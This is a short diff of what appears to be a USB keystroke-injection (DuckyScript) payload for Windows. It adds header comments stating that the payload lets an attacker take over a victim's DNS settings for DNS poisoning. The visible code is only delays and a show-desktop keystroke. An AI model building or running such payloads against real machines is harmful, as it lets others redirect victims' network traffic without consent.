@@ -2,6 +2,9 @@ REM Author: REDD (InfoSecREDD)
 REM Version: 0.12
 REM Category: Execution
 REM Target: All Windows
+REM --- --- --- ---
+REM This payload allows the attacker to take over DNS settings of the victim machine. (DNS Poisoning)
+REM -REDD
 DELAY 500
 GUI d
 DELAY 500
